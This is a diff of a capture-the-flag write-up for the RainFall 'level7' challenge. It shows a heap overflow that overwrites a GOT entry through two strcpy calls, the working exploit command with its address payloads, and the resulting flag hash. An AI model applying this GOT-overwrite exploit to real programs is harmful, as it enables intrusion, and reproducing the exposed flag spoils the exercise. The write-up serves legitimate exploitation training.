@@ -1,17 +1,8 @@
-We provoke an overflow into the first chunck to overwrite the following one with a GOT address.
-Then the 2nd strcpy will write inside the GOT address the value of the second argument.
-Our crafted GOT address is then called at the end of the function.
+# We provoke an overflow into the first chunck to overwrite the following one with a GOT address.
+# Then the 2nd strcpy will write inside the GOT address the value of the second argument.
+# Our crafted GOT address is then called at the end of the main function.
+# This new GOT address redirect to the "m" function who will display the content of fgets (the password) for us.
 
-
-Our 2 payloads are built as like :
-- python -c 'print "A"*20 + "\x28\x99\x04\x08"' > /tmp/payload
-- python -c 'print "\xf4\x84\x04\x08"' > /tmp/payload
-
-
-TODO
-
-EDIT:
-level7@RainFall:~$ ./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
+./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
  - 1526286774
-
